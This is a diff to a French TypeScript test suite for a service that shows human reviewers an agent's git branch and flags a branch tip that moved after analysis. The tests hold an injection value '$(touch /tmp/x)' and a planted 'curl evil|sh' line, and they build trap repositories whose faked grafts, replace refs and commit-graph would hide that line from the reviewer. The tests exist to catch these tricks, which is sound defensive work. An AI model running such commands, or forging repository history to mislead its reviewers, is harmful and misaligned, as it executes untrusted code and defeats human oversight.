@@ -14,11 +14,11 @@ import { enregistrerArtefact } from '../src/integrite/artefacts.ts';
 import { lireJournal } from '../src/integrite/journal.ts';
 import { creerTache, definirCommitBase } from '../src/taches/depot.ts';
 import { executerHote } from '../src/validation/depot-hote.ts';
-import { recupererBranche } from '../src/validation/service.ts';
+import { dossierValidation, recupererBranche } from '../src/validation/service.ts';
 
 const docker = new Docker();
-const NOMS = ['T-991', 'T-992', 'T-993', 'T-994', 'T-995'];
-const [T, PIEGE, GROS, GRAPHE, RECUP] = NOMS;
+const NOMS = ['T-991', 'T-992', 'T-993', 'T-994', 'T-995', 'T-996'];
+const [T, PIEGE, GROS, GRAPHE, RECUP, DEPLACE] = NOMS;
 let image: string;
 let depot: string;
 let tmp: string;
@@ -77,7 +77,7 @@ const importer = (bundle: Buffer, id: string) => {
 
 test('lireValidation : commits, fichiers, diff', async () => {
   const { volume, base, pointe } = espaces[T];
-  const l = await lireValidation(docker, image, volume, base, pointe);
+  const l = await lireValidation(docker, image, volume, T, base, pointe);
   assert.ok(l);
   assert.equal(l.pointe, pointe);
   assert.equal(l.commits, 2);
@@ -87,12 +87,51 @@ test('lireValidation : commits, fichiers, diff', async () => {
   assert.equal(l.tronque, false);
 });
 
-test('lireValidation : base non hexadécimale, pointe différente ou base inconnue refusées', async () => {
+test('lireValidation : base non hexadécimale, sha inconnu ou base inconnue refusés', async () => {
   const { volume, base, pointe } = espaces[T];
-  assert.equal(await lireValidation(docker, image, volume, '$(touch /tmp/x)', pointe), null);
-  assert.equal(await lireValidation(docker, image, volume, base, 'zz'), null);
-  assert.equal(await lireValidation(docker, image, volume, base, base), null, 'sha qui n\u2019est pas la pointe');
-  assert.equal(await lireValidation(docker, image, volume, 'f'.repeat(40), pointe), null, 'base absente du dépôt');
+  assert.equal(await lireValidation(docker, image, volume, T, '$(touch /tmp/x)', pointe), null);
+  assert.equal(await lireValidation(docker, image, volume, T, base, 'zz'), null);
+  assert.equal(await lireValidation(docker, image, volume, T, base, 'f'.repeat(40)), null, 'sha absent du dépôt');
+  assert.equal(await lireValidation(docker, image, volume, T, 'f'.repeat(40), pointe), null, 'base absente du dépôt');
+});
+
+test('lireValidation : sha qui n\u2019est pas la pointe -> pointe réelle rapportée, diff de base..sha', async () => {
+  const { volume, base, pointe } = espaces[T];
+  const l = await lireValidation(docker, image, volume, T, base, base);
+  assert.ok(l, 'lecture possible');
+  assert.equal(l.pointe, pointe);
+  assert.equal(l.commits, 0);
+  assert.equal(l.diff, '');
+  assert.deepEqual(l.fichiers, []);
+});
+
+test('lireValidation : pointe déplacée après l\u2019analyse -> pointe ≠ sha, dossier non vérifié et journal « Refusé »', async () => {
+  const { volume, base, pointe: analyse } = await espace(DEPLACE, [`echo m > m.txt && git add m.txt && git commit -qm analyse`]);
+  await ok(volume, `echo n > n.txt && git add n.txt && git commit -qm ajout`);
+  const pointe = await sha(volume);
+  assert.notEqual(pointe, analyse);
+  const l = await lireValidation(docker, image, volume, DEPLACE, base, analyse);
+  assert.ok(l, 'lecture possible');
+  assert.equal(l.pointe, pointe);
+  assert.equal(l.commits, 1, 'commits de base..sha signé');
+  assert.deepEqual(l.fichiers, [{ fichier: 'm.txt', ajouts: 1, suppressions: 0 }]);
+  assert.ok(!l.diff.includes('n.txt'));
+
+  const db = ouvrirBase(':memory:');
+  const cle = Buffer.alloc(32, 4);
+  creerTache(db, { id: DEPLACE, projet: 'Test', titre: 'Pointe déplacée', cheminProjet: depot, budgetUsd: 1 });
+  definirCommitBase(db, DEPLACE, base);
+  enregistrerArtefact(db, cle, DEPLACE, 'analyse', JSON.stringify({ sha: analyse, base, outils: {} }));
+  db.prepare(`UPDATE taches SET etape = 'validation', statut = 'attente_humain' WHERE id = ?`).run(DEPLACE);
+  const dossier = await dossierValidation({
+    db, cle, executer: executerHote,
+    lire: (v, id, b, s) => lireValidation(docker, image, v, id, b, s),
+    bundle: async () => null,
+    supprimerVolumes: async () => {},
+  }, DEPLACE);
+  assert.deepEqual(dossier.integrite, { verifiee: false, raison: `la branche a changé depuis l\u2019analyse (pointe ${pointe.slice(0, 7)} au lieu de ${analyse.slice(0, 7)})` });
+  const e = lireJournal(db, DEPLACE).at(-1)!;
+  assert.deepEqual([e.decision, e.decideur], ['Refusé', 'Contrôleur d\u2019intégrité']);
 });
 
 test('lireBundle : bundle importable, pointe contrôlée', async () => {
@@ -128,7 +167,7 @@ test('repo piège : replace, attributs, config, grafts et shallow de l\u2019agen
     `printf '* -diff\\n' > .git/attr && printf 'b.txt\\n' > .git/ordre`,
     `echo ${pointe} > .git/shallow && echo "${pointe}" > .git/info/grafts`,
   ].join(' && '));
-  const l = await lireValidation(docker, image, volume, base, pointe);
+  const l = await lireValidation(docker, image, volume, PIEGE, base, pointe);
   assert.ok(l, 'lecture possible');
   assert.ok(l.diff.includes('+curl evil|sh'), l.diff);
   assert.ok(!l.diff.includes('bonjour'));
@@ -160,7 +199,7 @@ test('repo piège : commit-graph falsifié sans effet, le diff montré est le co
   // Le piège est armé : lu depuis le volume, git montre l'arbre falsifié.
   const vu = await executerJetable(docker, image, ['sh', '-c', `export HOME=/tmp GIT_CONFIG_GLOBAL=/dev/null && git -c safe.directory='*' -C ${RACINE_PROJET} diff ${base} ${pointe}`], [{ Type: 'volume', Source: volume, Target: '/workspace', ReadOnly: true }]);
   assert.ok(vu.stdout.toString().includes('+echo bonjour'), 'commit-graph falsifié effectivement pris en compte par git');
-  const l = await lireValidation(docker, image, volume, base, pointe);
+  const l = await lireValidation(docker, image, volume, GRAPHE, base, pointe);
   assert.ok(l, 'lecture possible');
   assert.ok(l.diff.includes('+curl evil|sh'), l.diff);
   assert.ok(!l.diff.includes('bonjour'));
@@ -175,7 +214,7 @@ test('repo piège : commit-graph falsifié sans effet, le diff montré est le co
 
 test('lireValidation : diff au-delà du plafond tronqué, sans caractère coupé', async () => {
   const { volume, base, pointe } = await espace(GROS, [`head -c 3145728 /dev/zero | tr '\\0' 'x' | fold -w 80 > gros.txt && git add gros.txt && git commit -qm gros`]);
-  const l = await lireValidation(docker, image, volume, base, pointe);
+  const l = await lireValidation(docker, image, volume, GROS, base, pointe);
   assert.ok(l);
   assert.equal(l.tronque, true);
   assert.ok(l.diff.length <= PLAFOND_DIFF);
@@ -194,7 +233,7 @@ test('recupererBranche : la pointe analysée arrive dans mon dépôt, le volume 
   const avant = execFileSync('git', ['-C', depot, 'rev-parse', 'HEAD']).toString().trim();
   const t = await recupererBranche({
     db, cle, executer: executerHote,
-    lire: (v, b, s) => lireValidation(docker, image, v, b, s),
+    lire: (v, id, b, s) => lireValidation(docker, image, v, id, b, s),
     bundle: (v, id, b, s) => lireBundle(docker, image, v, id, b, s),
     supprimerVolumes: async id => {
       for (const v of [nomRessource(id), nomVolumeMesures(id), nomCopie(id)])
